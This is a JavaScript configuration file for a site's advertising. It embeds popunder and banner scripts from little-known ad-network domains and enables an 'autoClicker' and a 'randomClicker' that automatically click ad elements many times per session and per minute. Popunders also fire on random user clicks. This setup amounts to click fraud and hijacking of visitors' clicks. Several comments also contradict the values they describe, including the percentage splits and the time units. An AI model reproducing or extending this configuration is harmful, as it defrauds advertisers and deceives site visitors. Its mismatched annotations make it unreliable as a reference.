// Enhanced Ad Configuration
// You can easily modify this file to change ad embed codes and settings
export const adConfig = {
  // Popunder ad embed code
  popunderEmbedCode: `<script type='text/javascript' src='//cemeteryloinrespirator.com/2c/cf/4a/2ccf4adde15c77608f053ee7c15d745d.js'></script>`,
  
  // Native banner ad embed code (4:1 layout)
  nativeBannerEmbedCode: `<script async="async" data-cfasync="false" src="//pl27079327.profitableratecpm.com/15828a75f46035ac68ead98732c8d2bf/invoke.js"></script>
<div id="container-15828a75f46035ac68ead98732c8d2bf"></div>`,
  
  // Banner ad embed code (468x60)
  bannerEmbedCode: `<script type="text/javascript">
	atOptions = {
		'key' : '8577ee724313422c37f37871258a8b65',
		'format' : 'iframe',
		'height' : 60,
		'width' : 468,
		'params' : {}
	};
</script>
<script type="text/javascript" src="//www.highperformanceformat.com/8577ee724313422c37f37871258a8b65/invoke.js"></script>`,
  
  // Ad distribution settings
  adDistribution: {
    popunder: 0.3,      // 50% popunder ads
    nativeBanner: 0.2,  // 30% native banner ads
    banner: 0.5         // 20% banner ads
  },
  
  // General settings
  settings: {
    autoRefreshEnabled: true,
    minRefreshInterval: 1000000, //  seconds
    maxRefreshInterval: 6000000, //  seconds
    popunderChance: 0.25, // % chance on random clicks
    loadingDelay: {
      min: 50000,
      max: 250000
    },
    
    // Auto-clicker settings
    autoClicker: {
      enabled: true,
      minInterval: 500000,  //  seconds
      maxInterval: 1500000, //  seconds
      clicksPerSession: 18, // Maximum clicks per session
      targetAdsOnly: true   // Only click on ad elements
    },
    
    // Random clicker settings
    randomClicker: {
      enabled: true,
      probability: 5.0,    // % chance per interval
      interval: 100000,       // Check every 3 seconds
      maxClicksPerMinute: 81 // Limit random clicks
    }
  }
};
